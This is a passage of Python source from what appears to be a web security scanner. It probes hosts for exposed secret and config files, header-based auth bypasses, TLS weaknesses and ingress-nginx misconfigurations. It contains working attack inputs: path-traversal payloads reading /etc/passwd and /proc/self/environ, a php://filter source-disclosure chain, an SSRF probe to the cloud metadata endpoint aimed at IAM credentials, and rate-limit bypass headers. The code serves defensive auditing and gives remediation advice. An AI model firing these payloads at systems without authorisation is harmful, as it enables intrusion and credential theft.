        ('/.git/config',    'CRITICAL', 'GIT_CONFIG_EXPOSED',    'Git config exposed'),
        ('/.env',           'CRITICAL', 'ENV_FILE_EXPOSED',       '.env secrets file exposed'),
        ('/wp-config.php',  'CRITICAL', 'WP_CONFIG_EXPOSED',      'WordPress config exposed'),
        ('/config.php',     'CRITICAL', 'CONFIG_PHP_EXPOSED',     'config.php exposed'),
        ('/web.config',     'CRITICAL', 'WEB_CONFIG_EXPOSED',     'IIS web.config exposed'),
        ('/composer.json',  'MEDIUM',   'COMPOSER_JSON_EXPOSED',  'composer.json exposed'),
        ('/package.json',   'MEDIUM',   'PACKAGE_JSON_EXPOSED',   'package.json exposed'),
        ('/.htpasswd',      'HIGH',     'HTPASSWD_EXPOSED',       '.htpasswd exposed'),
        ('/.htaccess',      'HIGH',     'HTACCESS_EXPOSED',       '.htaccess exposed'),
        ('/.DS_Store',      'MEDIUM',   'DS_STORE_EXPOSED',       '.DS_Store exposed'),
        ('/admin/',         'HIGH',     'ADMIN_DIR_EXPOSED',      '/admin/ accessible'),
        ('/backup/',        'HIGH',     'BACKUP_DIR_EXPOSED',     '/backup/ accessible'),
        ('/server-status',  'MEDIUM',   'SERVER_STATUS_EXPOSED',  'Apache server-status exposed'),
        ('/nginx-status',   'MEDIUM',   'NGINX_STATUS_EXPOSED',   'nginx-status exposed'),
        ('/phpinfo.php',    'MEDIUM',   'PHPINFO_EXPOSED',        'phpinfo() page exposed'),
        ('/info.php',       'MEDIUM',   'INFO_PHP_EXPOSED',       'info.php exposed'),
    ]

    for path, severity, title, desc in path_map:
        code, hdrs, body = _http_get(host, port, path,
                                     use_tls=use_tls, timeout=timeout)
        if code == 0:
            continue
        if code == 200 or (path == '/.git/config' and code not in (404,)):
            findings.append({
                'severity': severity,
                'title': title,
                'detail': f'GET {path} -> HTTP {code}; body={body[:120]!r}',
                'host': host,
                'port': port,
            })

    return findings


def probe_auth_bypass_patterns(
        host: str, port: int = 443, use_tls: bool = True,
        timeout: float = 5.0) -> list:
    """
    Test HTTP authentication bypass techniques against /admin/.
    Returns findings list.
    """
    findings = []

    # Baseline — what does a plain GET return?
    base_code, _, _ = _http_get(host, port, '/admin/',
                                use_tls=use_tls, timeout=timeout)

    bypass_tests = [
        (
            {'X-Forwarded-For': '127.0.0.1'},
            'AUTH_BYPASS_XFF',
            'CRITICAL',
            'Auth bypass via X-Forwarded-For: 127.0.0.1',
        ),
        (
            {'X-Real-IP': '127.0.0.1'},
            'AUTH_BYPASS_XREALIP',
            'CRITICAL',
            'Auth bypass via X-Real-IP: 127.0.0.1',
        ),
        (
            {'X-Original-URL': '/'},
            'ORIGINAL_URL_BYPASS',
            'CRITICAL',
            'Auth bypass via X-Original-URL: / (Symfony/Laravel)',
        ),
    ]

    for extra_hdrs, title, severity, desc in bypass_tests:
        code, _, _ = _http_get(host, port, '/admin/',
                               headers=extra_hdrs,
                               use_tls=use_tls, timeout=timeout)
        if code == 200 and base_code in (401, 403):
            findings.append({
                'severity': severity,
                'title': title,
                'detail': f'baseline={base_code}; bypass headers={extra_hdrs} -> 200',
                'host': host,
                'port': port,
            })

    # Path normalisation bypass
    code, _, _ = _http_get(host, port, '/admin/../admin/',
                           use_tls=use_tls, timeout=timeout)
    if code == 200 and base_code in (401, 403):
        findings.append({
            'severity': 'HIGH',
            'title': 'PATH_NORMALIZATION_BYPASS',
            'detail': f'GET /admin/../admin/ -> 200 while plain /admin/ -> {base_code}',
            'host': host,
            'port': port,
        })

    # Case sensitivity bypass
    code, _, _ = _http_get(host, port, '/ADMIN/',
                           use_tls=use_tls, timeout=timeout)
    if code == 200 and base_code in (401, 403):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'CASE_SENSITIVITY_BYPASS',
            'detail': f'GET /ADMIN/ -> 200 while plain /admin/ -> {base_code}',
            'host': host,
            'port': port,
        })

    return findings


def probe_web_framework_disclosure(
        host: str, port: int = 443, use_tls: bool = True,
        timeout: float = 5.0) -> list:
    """
    Fingerprint web framework / CMS from response headers and login pages.
    Returns findings list.
    """
    findings = []

    code, hdrs, body = _http_get(host, port, '/',
                                 use_tls=use_tls, timeout=timeout)

    if code != 0:
        # X-Powered-By
        xpb = hdrs.get('x-powered-by', '')
        if xpb:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'FRAMEWORK_DISCLOSED_HEADER',
                'detail': f'X-Powered-By: {xpb}',
                'host': host,
                'port': port,
            })

        # Server header with version number
        server_hdr = hdrs.get('server', '')
        if server_hdr and re.search(r'\d+\.\d+', server_hdr):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'VERSION_DISCLOSED_SERVER',
                'detail': f'Server: {server_hdr}',
                'host': host,
                'port': port,
            })

        # Generator / CMS headers
        for hname in ('x-generator', 'x-cms', 'x-drupal-cache',
                      'x-wordpress-theme'):
            val = hdrs.get(hname, '')
            if val:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'CMS_DISCLOSED',
                    'detail': f'{hname}: {val}',
                    'host': host,
                    'port': port,
                })

        # PHPSESSID in Set-Cookie
        sc = hdrs.get('set-cookie', '')
        if 'PHPSESSID' in sc:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'PHP_SESSION_COOKIE',
                'detail': f'Set-Cookie: {sc[:120]}',
                'host': host,
                'port': port,
            })

    # WordPress admin login
    code, _, body = _http_get(host, port, '/wp-login.php',
                              use_tls=use_tls, timeout=timeout)
    if code == 200:
        findings.append({
            'severity': 'HIGH',
            'title': 'WORDPRESS_ADMIN_LOGIN_EXPOSED',
            'detail': f'GET /wp-login.php -> 200; body={body[:80]!r}',
            'host': host,
            'port': port,
        })

    # Joomla admin
    code, _, body = _http_get(host, port, '/administrator/index.php',
                              use_tls=use_tls, timeout=timeout)
    if code == 200:
        findings.append({
            'severity': 'HIGH',
            'title': 'JOOMLA_ADMIN_EXPOSED',
            'detail': f'GET /administrator/index.php -> 200; body={body[:80]!r}',
            'host': host,
            'port': port,
        })

    # Drupal login
    code, _, body = _http_get(host, port, '/user/login',
                              use_tls=use_tls, timeout=timeout)
    if code == 200 and (b'Drupal' in body or b'drupal' in body):
        findings.append({
            'severity': 'HIGH',
            'title': 'DRUPAL_LOGIN_EXPOSED',
            'detail': f'GET /user/login -> 200 with Drupal marker',
            'host': host,
            'port': port,
        })

    return findings


def probe_directory_listing(
        host: str, port: int = 443, use_tls: bool = True,
        timeout: float = 5.0) -> list:
    """
    Check for nginx/Apache directory listing (autoindex on) across common dirs.
    Returns findings list.
    """
    findings = []

    _INDEX_RE = re.compile(
        rb'Index of\s|<title>Index of|<a href="\.\./"|Parent Directory',
        re.IGNORECASE,
    )

    path_config = [
        ('/api/',      'CRITICAL', 'API_DIRECTORY_LISTING'),
        ('/backup/',   'HIGH',     'BACKUP_DIRECTORY_LISTING'),
        ('/images/',   'HIGH',     'DIRECTORY_LISTING_ENABLED'),
        ('/js/',       'HIGH',     'DIRECTORY_LISTING_ENABLED'),
        ('/css/',      'HIGH',     'DIRECTORY_LISTING_ENABLED'),
        ('/static/',   'HIGH',     'DIRECTORY_LISTING_ENABLED'),
        ('/uploads/',  'HIGH',     'DIRECTORY_LISTING_ENABLED'),
        ('/files/',    'HIGH',     'DIRECTORY_LISTING_ENABLED'),
        ('/assets/',   'HIGH',     'DIRECTORY_LISTING_ENABLED'),
    ]

    for path, severity, title in path_config:
        code, _, body = _http_get(host, port, path,
                                  use_tls=use_tls, timeout=timeout)
        if code == 200 and _INDEX_RE.search(body):
            findings.append({
                'severity': severity,
                'title': title,
                'detail': f'GET {path} -> directory listing; snippet={body[:120]!r}',
                'host': host,
                'port': port,
            })

    return findings


# ── Security header analysis ─────────────────────────────────────────────────

def probe_security_headers(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Security header analysis.  GET / and inspect response headers.
    Returns findings list: each entry is {severity, title, detail, host, port}.

    Missing headers mapped to risk:
      HSTS absent            → HIGH   (MITM downgrade)
      CSP absent             → MEDIUM (XSS amplification)
      X-Frame-Options absent → MEDIUM (clickjacking)
      X-Content-Type-Options → MEDIUM (MIME sniffing)
      Server version present → LOW    (fingerprinting / CVE targeting)
      Permissions-Policy     → LOW    (browser feature leakage)
    """
    findings = []
    use_tls = port != 80
    code, hdrs, body = _http_get(host, port, '/', use_tls=use_tls, timeout=timeout)
    if code == 0:
        return findings

    # HSTS — required on any TLS endpoint; absent = downgrade risk
    if use_tls and 'strict-transport-security' not in hdrs:
        findings.append({
            'severity': 'HIGH',
            'title': 'HSTS_ABSENT',
            'detail': 'Strict-Transport-Security header missing — MITM downgrade risk; '
                      'browsers will accept HTTP version of the site',
            'host': host,
            'port': port,
        })

    # CSP — absence allows inline script execution; amplifies XSS
    if 'content-security-policy' not in hdrs:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'CSP_ABSENT',
            'detail': 'Content-Security-Policy header missing — no script source allowlist; '
                      'stored/reflected XSS executes without policy barrier',
            'host': host,
            'port': port,
        })

    # X-Frame-Options — clickjacking via iframe embedding
    if 'x-frame-options' not in hdrs:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'CLICKJACKING_PROTECTION_ABSENT',
            'detail': 'X-Frame-Options header missing — page can be embedded in a foreign iframe; '
                      'clickjacking attacks viable',
            'host': host,
            'port': port,
        })

    # X-Content-Type-Options: nosniff — MIME sniffing attack surface
    xcto = hdrs.get('x-content-type-options', '')
    if 'nosniff' not in xcto.lower():
        findings.append({
            'severity': 'MEDIUM',
            'title': 'MIME_SNIFFING_ENABLED',
            'detail': 'X-Content-Type-Options: nosniff absent — browser may MIME-sniff '
                      'response as executable type, enabling content injection',
            'host': host,
            'port': port,
        })

    # Server header version disclosure — enables CVE targeting
    server = hdrs.get('server', '')
    if re.search(r'(apache|nginx|iis|lighttpd|litespeed)/[\d.]+', server, re.IGNORECASE):
        findings.append({
            'severity': 'LOW',
            'title': 'SERVER_VERSION_DISCLOSURE',
            'detail': f'Server header reveals product and version: "{server}" — '
                      'narrows attacker CVE search space; set server_tokens off (nginx) '
                      'or ServerTokens Prod (Apache)',
            'host': host,
            'port': port,
        })

    # Permissions-Policy (formerly Feature-Policy) — controls browser feature access
    if 'permissions-policy' not in hdrs and 'feature-policy' not in hdrs:
        findings.append({
            'severity': 'LOW',
            'title': 'PERMISSIONS_POLICY_ABSENT',
            'detail': 'Permissions-Policy header missing — browser features (camera, '
                      'geolocation, microphone) not explicitly restricted per origin',
            'host': host,
            'port': port,
        })

    return findings


# ── CGI and server-side include exposure ──────────────────────────────────────

def probe_cgi_exposure(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    CGI bin directory and Apache diagnostic endpoint exposure.
    Returns findings list.

    Checks:
      /cgi-bin/           → CRITICAL if 200 (directory accessible / listing)
      /cgi-bin/printenv   → CRITICAL if 200 (environment variables disclosed)
      /cgi-bin/test-cgi   → CRITICAL if 200 (CGI test script accessible)
      /server-status      → HIGH     if 200 (Apache mod_status: request rate + IPs)
      /server-info        → HIGH     if 200 (Apache mod_info: module configuration)
    """
    findings = []
    use_tls = port != 80

    probes = [
        ('/cgi-bin/',           'CRITICAL', 'CGI_BIN_ACCESSIBLE',
         '/cgi-bin/ directory accessible — CGI execution surface exposed'),
        ('/cgi-bin/printenv',   'CRITICAL', 'CGI_PRINTENV_EXPOSED',
         'CGI printenv script accessible — server environment variables disclosed to anonymous requests'),
        ('/cgi-bin/test-cgi',   'CRITICAL', 'CGI_TEST_EXPOSED',
         'CGI test script accessible — exposes PATH, server env, CGI version'),
        ('/server-status',      'HIGH',     'APACHE_SERVER_STATUS_EXPOSED',
         'Apache mod_status /server-status exposed — active request rate, client IPs, '
         'virtual hosts, and worker state visible without authentication'),
        ('/server-info',        'HIGH',     'APACHE_SERVER_INFO_EXPOSED',
         'Apache mod_info /server-info exposed — compiled module list and configuration '
         'directives visible; aids targeted attack planning'),
    ]

    for path, severity, title, detail in probes:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls, timeout=timeout)
        if code == 0:
            continue
        body_str = body[:512].decode('utf-8', errors='replace') if body else ''

        # 200 is the confirmation signal; directory listing also qualifies for /cgi-bin/
        is_hit = (code == 200)
        if path == '/cgi-bin/' and not is_hit:
            # Directory listing returned as non-200 on some configs
            is_hit = ('Index of' in body_str or 'Directory listing' in body_str)

        if is_hit:
            findings.append({
                'severity': severity,
                'title': title,
                'detail': f'{detail}; HTTP {code}; excerpt={body_str[:120]!r}',
                'host': host,
                'port': port,
            })

    return findings


# ── TLS security configuration ────────────────────────────────────────────────

def probe_tls_configuration(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    TLS security posture checks using stdlib ssl module only.
    Returns findings list.

    Checks:
      Self-signed certificate (issuer == subject)   → HIGH
      OCSP stapling absent (cert has OCSP URL)      → MEDIUM
      SNI not required (HTTP/1.0 no-SNI → 200)      → MEDIUM
      TLS session ticket reuse confirmed             → MEDIUM
    """
    findings = []

    # ── 1. Certificate inspection: self-signed + OCSP stapling ────────────────
    first_session = None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((host, port), timeout=timeout)
        tls_sock = ctx.wrap_socket(sock, server_hostname=host)
        cert = tls_sock.getpeercert()
        first_session = tls_sock.session
        tls_sock.close()

        if cert:
            # Self-signed: issuer dict == subject dict
            try:
                subject = dict(x[0] for x in cert.get('subject', ()))
                issuer = dict(x[0] for x in cert.get('issuer', ()))
                if subject and subject == issuer:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'SELF_SIGNED_CERTIFICATE',
                        'detail': f'Certificate issuer equals subject — '
                                  f'no trusted CA chain; subject={subject}',
                        'host': host,
                        'port': port,
                    })
            except Exception:
                pass

            # OCSP stapling: Python stdlib does not expose whether the server
            # included a stapled OCSP response in the TLS handshake.  If the
            # cert advertises an OCSP responder URL, absence of stapling means
            # clients must do live OCSP lookups — adds latency and leaks
            # connection metadata to the CA.
            ocsp_urls = cert.get('OCSP', ())
            if ocsp_urls:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'OCSP_STAPLING_ABSENT',
                    'detail': f'Certificate OCSP responder: {ocsp_urls[0]}; '
                              f'no stapled response detected in TLS handshake — '
                              f'clients perform live OCSP lookups, leaking connection '
                              f'metadata to CA; configure ssl_stapling on (nginx) or '
                              f'SSLUseStapling On (Apache)',
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # ── 2. TLS session ticket reuse detection ─────────────────────────────────
    if first_session is not None:
        try:
            ctx2 = ssl.create_default_context()
            ctx2.check_hostname = False
            ctx2.verify_mode = ssl.CERT_NONE
            sock2 = socket.create_connection((host, port), timeout=timeout)
            tls_sock2 = ctx2.wrap_socket(sock2, server_hostname=host,
                                         session=first_session)
            reused = tls_sock2.session_reused
            tls_sock2.close()
            if reused:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'TLS_SESSION_TICKETS_ENABLED',
                    'detail': 'TLS session ticket accepted and reused on reconnect — '
                              'forward secrecy is breakable if ticket encryption key is '
                              'compromised; rotate ticket keys every 1-24h or disable '
                              'with ssl_session_tickets off (nginx)',
                    'host': host,
                    'port': port,
                })
        except Exception:
            pass

    # ── 3. SNI not required ───────────────────────────────────────────────────
    # Connect without SNI extension (server_hostname omitted) and send HTTP/1.0.
    # If 200 is returned, the server falls back to a default virtual host and
    # does not enforce SNI — virtual host bypass is possible.
    try:
        ctx3 = ssl.create_default_context()
        ctx3.check_hostname = False
        ctx3.verify_mode = ssl.CERT_NONE
        sock3 = socket.create_connection((host, port), timeout=timeout)
        # Wrap without server_hostname → no SNI extension in ClientHello
        tls_sock3 = ctx3.wrap_socket(sock3)
        req = (
            f'GET / HTTP/1.0\r\n'
            f'Host: {host}\r\n'
            '\r\n'
        ).encode()
        tls_sock3.sendall(req)
        resp = b''
        tls_sock3.settimeout(timeout)
        try:
            while True:
                chunk = tls_sock3.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 65536:
                    break
        except socket.timeout:
            pass
        tls_sock3.close()

        if resp:
            try:
                code = int(resp.split(b'\r\n')[0].split()[1])
            except (IndexError, ValueError):
                code = 0
            if code == 200:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'SNI_NOT_REQUIRED',
                    'detail': 'Server returns 200 on HTTP/1.0 request without SNI extension — '
                              'default_server virtual host bypassed; attacker can reach '
                              'internal vhost without knowing hostname; '
                              'enforce SNI with ssl_reject_handshake on (nginx >= 1.19.4)',
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    return findings


# ── Local file inclusion / path traversal surface ─────────────────────────────

def probe_lfi_surface(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Local file inclusion and path traversal confirmation probes.
    Injects common LFI/SSRF payloads into generic query parameters.
    Returns findings list.

    Probes:
      /?page=../../../../etc/passwd            → CRITICAL if "root:" in body
      /?page=../../../etc/passwd              → CRITICAL if "root:" in body (3-level)
      /?file=../../../../../proc/self/environ → CRITICAL if "HTTP_" in body
      /?include=php://filter/...             → CRITICAL if base64 block returned
      /?page=http://169.254.169.254/...      → CRITICAL if "ami-id" in body (SSRF→IMDS)
    """
    findings = []
    use_tls = port != 80

    lfi_probes = [
        (
            '/?page=' + '%2e%2e%2f' * 4 + 'etc/passwd',
            'root:',
            'CRITICAL',
            'LFI_CONFIRMED',
            'LFI confirmed — /etc/passwd readable via page parameter; '
            'path traversal (4 levels, URL-encoded) succeeds',
        ),
        (
            '/?page=../../../etc/passwd',
            'root:',
            'CRITICAL',
            'LFI_CONFIRMED',
            'LFI confirmed — /etc/passwd readable via page parameter; '
            'path traversal (3 levels) succeeds',
        ),
        (
            '/?file=../../../../../proc/self/environ',
            'HTTP_',
            'CRITICAL',
            'LFI_PROC_ENVIRON',
            'LFI proc/self/environ — server environment variables readable; '
            'may expose HTTP_AUTHORIZATION, database credentials, API keys',
        ),
        (
            '/?include=php://filter/convert.base64-encode/resource=index.php',
            None,  # special: check for base64 block
            'CRITICAL',
            'PHP_FILTER_LFI',
            'PHP filter wrapper LFI — source of index.php returned base64-encoded; '
            'arbitrary PHP source readable via php://filter chain',
        ),
        (
            '/?page=http://169.254.169.254/latest/meta-data/',
            'ami-id',
            'CRITICAL',
            'SSRF_TO_IMDS_VIA_LFI',
            'SSRF to AWS IMDS via LFI include parameter — EC2 metadata accessible; '
            'chain to credential theft via /latest/meta-data/iam/security-credentials/',
        ),
    ]

    seen_lfi_confirmed = False

    for path, marker, severity, title, detail in lfi_probes:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls, timeout=timeout)
        if code == 0:
            continue
        body_str = body[:4096].decode('utf-8', errors='replace') if body else ''

        hit = False
        if title == 'LFI_CONFIRMED':
            # Deduplicate: only report once even if both depth variants hit
            if marker and marker in body_str and not seen_lfi_confirmed:
                hit = True
                seen_lfi_confirmed = True
        elif title == 'PHP_FILTER_LFI':
            # Expect a base64-encoded block — at least 100 contiguous base64 chars
            if code == 200 and re.search(r'[A-Za-z0-9+/]{100,}={0,2}', body_str):
                hit = True
        else:
            if marker and marker in body_str:
                hit = True

        if hit:
            findings.append({
                'severity': severity,
                'title': title,
                'detail': f'{detail}; path={path}; excerpt={body_str[:120]!r}',
                'host': host,
                'port': port,
            })

    return findings


# ── Kubernetes Nginx Ingress Controller exposure ───────────────────────────────

def probe_nginx_ingress_controller(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Nginx Ingress Controller exposure probes (ingress-nginx).

    Synthesized from:
      Kubernetes in Action 2e ch.12 — Ingress controllers, TLS termination at
      ingress, Nginx ingress annotations (session affinity, passthrough, CORS);
      ch.13 — Gateway API, LoadBalancer service provisioning per gateway.

    Attack surface:
      /healthz              — controller liveness; exposes product + port confirmation
      :10254/metrics        — Prometheus scrape port; unauth on controller pod
      /nginx-status         — stub_status clone; active conn counters
      X-Forwarded-For echo  — use-forwarded-headers misconfiguration

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    sentinel = 'ngx-probe-XFF-7f1a'
    use_tls_main = port != 80

    # 1. /healthz — try primary port then port 80
    # ingress-nginx exposes /healthz on the same port as the data plane when
    # healthz-port is not separately configured; version leak in Server header
    # confirms nginx build and aids CVE targeting
    for probe_port, probe_tls in ((port, use_tls_main), (80, False)):
        code, hdrs, _ = _http_get(
            host, probe_port, '/healthz',
            use_tls=probe_tls, timeout=timeout,
        )
        if code == 200:
            server = hdrs.get('server', '')
            if re.search(r'nginx(?:/[\d.]+)?', server, re.IGNORECASE):
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'NGINX_INGRESS_HEALTH_EXPOSED',
                    'detail': (
                        f'Nginx ingress controller /healthz returns 200 on port {probe_port}; '
                        f'Server: {server!r} — liveness endpoint reachable without '
                        'authentication; confirms ingress-nginx deployment and version; '
                        'restrict via NetworkPolicy (allow only kubelet CIDR) or '
                        'set healthz-port to a non-public pod port'
                    ),
                    'host': host,
                    'port': probe_port,
                })
                break

    # 2. /metrics on port 10254 — Prometheus scrape port for ingress-nginx pods
    # K8s in Action §12.1.2: controller pod exposes metrics on a dedicated port;
    # default 10254 is the ingress-nginx upstream default; not TLS
    code, _, body_met = _http_get(
        host, 10254, '/metrics',
        use_tls=False, timeout=timeout,
    )
    if code == 200:
        snippet = body_met[:2048].decode('utf-8', errors='replace')
        if '# HELP' in snippet or '# TYPE' in snippet:
            findings.append({
                'severity': 'HIGH',
                'title': 'NGINX_INGRESS_METRICS_UNAUTH',
                'detail': (
                    'Nginx ingress controller Prometheus metrics (:10254/metrics) '
                    'accessible without authentication — exposes request rates, upstream '
                    'latency, TLS handshake counts, active connection pool, and per-ingress '
                    'throughput; chains to traffic-pattern inference and backend mapping; '
                    'restrict scrape port to monitoring namespace via NetworkPolicy'
                ),
                'host': host,
                'port': 10254,
            })

    # 3. /nginx-status and /stub_status — active connection counter disclosure
    # Kubernetes ingress manifests frequently omit the allow/deny ACL for the
    # status location block; default ingress-nginx config includes /nginx-status
    for status_path in ('/nginx-status', '/stub_status'):
        code, _, body_st = _http_get(
            host, port, status_path,
            use_tls=use_tls_main, timeout=timeout,
        )
        if code == 200:
            snippet = body_st[:1024].decode('utf-8', errors='replace')
            if re.search(r'[Aa]ctive\s+connections?\s*:\s*\d+', snippet):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'NGINX_STATUS_EXPOSED',
                    'detail': (
                        f'Nginx stub_status at {status_path} returns active connection '
                        'counters without authentication — reveals request throughput, '
                        'reading/writing/waiting worker state, and total handled requests; '
                        'add "allow 127.0.0.1; deny all;" inside the status location block'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    # 4. X-Forwarded-For reflection — header injection via use-forwarded-headers
    # Nginx ingress annotation nginx.ingress.kubernetes.io/use-forwarded-headers
    # causes the controller to pass client-supplied XFF verbatim to the backend;
    # if the backend reflects it in the response body or sets it as a response
    # header, the ingress is a header-injection relay
    code, hdrs_xff, body_xff = _http_get(
        host, port, '/',
        headers={'X-Forwarded-For': sentinel},
        use_tls=use_tls_main, timeout=timeout,
    )
    if code != 0:
        body_str = body_xff[:4096].decode('utf-8', errors='replace')
        resp_hdr_str = ' '.join(hdrs_xff.values())
        if sentinel in body_str or sentinel in resp_hdr_str:
            findings.append({
                'severity': 'HIGH',
                'title': 'NGINX_HEADER_INJECTION_REFLECTED',
                'detail': (
                    f'X-Forwarded-For value {sentinel!r} echoed in response body or '
                    'headers — ingress forwards raw client-controlled XFF to backend '
                    'without sanitisation; exploitable for IP spoofing in access logs, '
                    'WAF bypass, and downstream header injection if backend trusts XFF; '
                    'set use-forwarded-headers to false or restrict to trusted proxy CIDR '
                    'via proxy-real-ip-cidr annotation'
                ),
                'host': host,
                'port': port,
            })

    return findings


# ── Nginx rate-limit bypass and header override surface ───────────────────────

def probe_nginx_rate_limit_bypass(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Rate-limit bypass and header override probes.

    Synthesized from:
      Kubernetes in Action 2e ch.12 — Nginx ingress annotations (limit-rps,
      limit-connections, authentication, URL rewriting via configuration-snippet);
      ch.13 — Gateway API HTTPRoute filter rewrites and header manipulation.

    Probes:
      20 rapid GET /api/v1/auth/login   → HIGH     NO_RATE_LIMITING
      X-Real-IP: 127.0.0.1 bypass      → CRITICAL RATE_LIMIT_BYPASS_VIA_HEADER
      X-Original-URL: /admin/config    → CRITICAL URL_OVERRIDE_HEADER_ACCEPTED
      Cache-Control: no-cache + nonce  → MEDIUM   CACHE_POISONING_SURFACE

    Returns list of {severity, title, detail, host, port}.
    """
    import random
    import string

    findings = []
    use_tls = port != 80
    login_path = '/api/v1/auth/login'

    # 1. Rate-limit absence — 20 rapid requests; any 429 = limiting active
    # ingress-nginx limit-rps / limit-connections annotations gate brute-force;
    # absence exposes auth endpoint to unlimited credential enumeration
    codes = []
    for _ in range(20):
        code, _, _ = _http_get(host, port, login_path, use_tls=use_tls, timeout=timeout)
        codes.append(code)

    valid_codes = [c for c in codes if c != 0]
    rate_limited = any(c == 429 for c in valid_codes)

    if valid_codes and not rate_limited:
        findings.append({
            'severity': 'HIGH',
            'title': 'NO_RATE_LIMITING',
            'detail': (
                f'20 rapid requests to {login_path} returned no 429 responses '
                f'(codes observed: {sorted(set(valid_codes))}); '
                'authentication endpoint lacks rate-limit controls — brute-force surface; '
                'set nginx.ingress.kubernetes.io/limit-rps annotation or add '
                'limit_req_zone in configuration-snippet'
            ),
            'host': host,
            'port': port,
        })

    # 2. X-Real-IP: 127.0.0.1 rate-limit bypass
    # ingress-nginx keys per-IP rate limit on $remote_addr or $http_x_real_ip
    # depending on use-forwarded-headers / use-proxy-protocol; spoofed loopback
    # resets the per-client counter when header is trusted
    bypass_codes = []
    for _ in range(5):
        code, _, _ = _http_get(
            host, port, login_path,
            headers={'X-Real-IP': '127.0.0.1'},
            use_tls=use_tls, timeout=timeout,
        )
        bypass_codes.append(code)

    bypass_valid = [c for c in bypass_codes if c != 0]
    if bypass_valid:
        bypass_has_429 = any(c == 429 for c in bypass_valid)
        if rate_limited and not bypass_has_429:
            # Rate limit was active; bypass header removed it
            findings.append({
                'severity': 'CRITICAL',
                'title': 'RATE_LIMIT_BYPASS_VIA_HEADER',
                'detail': (
                    'Rate limiting triggered on direct requests (429 observed) but '
                    'X-Real-IP: 127.0.0.1 header bypasses the counter — subsequent '
                    'requests succeed without 429; ingress keys rate limit on '
                    'client-supplied header instead of socket remote address; '
                    'allows unlimited brute-force from any IP; '
                    'disable use-forwarded-headers or restrict trusted CIDR via '
                    'proxy-real-ip-cidr annotation'
                ),
                'host': host,
                'port': port,
            })
        elif not rate_limited and not bypass_has_429:
            # No rate limiting at all but header is still accepted — lower signal
            # already captured by NO_RATE_LIMITING; skip duplicate
            pass

    # 3. X-Original-URL override — internal path surfacing via header
    # Nginx (and some ingress-nginx configuration-snippet directives) can honour
    # X-Original-URL (Microsoft-originated) to rewrite the effective request URI;
    # misconfigured ingress rules expose admin paths through public endpoints
    code_base, _, body_base = _http_get(host, port, '/', use_tls=use_tls, timeout=timeout)
    code_ovr, _, body_ovr = _http_get(
        host, port, '/',
        headers={'X-Original-URL': '/admin/config'},
        use_tls=use_tls, timeout=timeout,
    )
    if code_base != 0 and code_ovr == 200:
        body_base_str = body_base[:4096].decode('utf-8', errors='replace')
        body_ovr_str = body_ovr[:4096].decode('utf-8', errors='replace')
        admin_markers = ('admin', 'config', 'dashboard', 'setting', 'panel', 'management')
        if (body_ovr_str != body_base_str
                and any(m in body_ovr_str.lower() for m in admin_markers)):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'URL_OVERRIDE_HEADER_ACCEPTED',
                'detail': (
                    'X-Original-URL: /admin/config header caused the server to return '
                    'different content containing admin-related markers — URL override '
                    'accepted by nginx or upstream proxy; attacker can access restricted '
                    'paths through public endpoint bypassing ingress path-based rules; '
                    'remove X-Original-URL handling from proxy_set_header blocks and '
                    'audit configuration-snippet annotations for pass-through directives'
                ),
                'host': host,
                'port': port,
            })

    # 4. Cache poisoning surface — Cache-Control: no-cache + unique query nonce
    # Nginx proxy_cache keying on URI without query string allows a poisoned
    # response (fetched with the nonce param) to be served to subsequent clients
    # requesting the canonical path; ingress-nginx proxy-buffering annotation
    # controls whether caching is active
    nonce = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    code_nc, hdrs_nc, body_nc = _http_get(
        host, port, f'{login_path}?_nc={nonce}',
        headers={'Cache-Control': 'no-cache'},
        use_tls=use_tls, timeout=timeout,
    )
    code_pl, _, body_pl = _http_get(host, port, login_path, use_tls=use_tls, timeout=timeout)

    if code_nc != 0 and code_pl != 0:
        body_nc_str = body_nc[:4096].decode('utf-8', errors='replace')
        body_pl_str = body_pl[:4096].decode('utf-8', errors='replace')
        size_delta = abs(len(body_nc_str) - len(body_pl_str))
        cache_signal = any(
            k in hdrs_nc for k in ('x-cache', 'age', 'cf-cache-status', 'x-cache-status')
        )
        if body_nc_str != body_pl_str and (size_delta > 50 or cache_signal):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'CACHE_POISONING_SURFACE',
                'detail': (
                    f'Response to {login_path}?_nc={nonce} (Cache-Control: no-cache) '
                    f'differs from uncached baseline by {size_delta} bytes'
                    + ('; cache response headers present' if cache_signal else '')
                    + ' — cache layer may not normalise query strings in cache key; '
                    'attacker can poison cached auth responses served to other clients; '
                    'verify proxy_cache_key includes $uri$is_args$args and review '
                    'ingress-nginx proxy-buffering / proxy-cache-key annotations'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_nginx_error_log_exposure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    findings = []
    use_tls = port == 443

    alias_bases = [
        '/static/', '/assets/', '/media/', '/files/', '/images/',
        '/css/', '/js/', '/upload/', '/downloads/', '/public/',
    ]
